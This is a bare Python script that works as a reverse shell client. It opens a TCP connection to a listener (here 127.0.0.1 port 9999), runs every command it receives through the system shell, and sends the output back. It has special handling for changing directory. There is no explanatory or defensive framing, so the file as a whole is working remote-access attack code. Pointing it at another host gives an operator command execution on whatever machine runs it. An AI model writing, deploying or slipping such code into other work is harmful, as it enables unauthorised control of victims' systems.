import socket 
import subprocess
import os

def shell(c):
    while True:
        cmd = c.recv(2024).decode()
        if "cd" in cmd: 
            try: 
                os.chdir(cmd[3:])
                output = subprocess.getoutput("pwd")
                message = f"{output}"  
                c.send(message.encode()) 
            except FileNotFoundError as e: 
                output = str(e) 
            else: 
                output = ""
        else:
            output = subprocess.getoutput(cmd)
            message = f"{output}"  
            c.send(message.encode())

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
sock.connect(("127.0.0.1", 9999))
shell(sock)